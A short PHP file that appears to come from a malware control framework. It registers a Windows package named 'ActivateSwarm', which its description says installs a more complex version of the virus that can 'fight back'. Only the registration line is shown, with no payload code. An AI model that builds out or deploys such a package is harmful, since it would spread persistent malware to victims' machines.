<?php

use Kelvinho\Virus\Attack\Classes;
use Kelvinho\Virus\Attack\PackageRegistrar;

PackageRegistrar::register("win.oneTime.ActivateSwarm", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ActivateSwarm", "adv.ActivateSwarm", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Installs a more complex version of this virus that can fight back");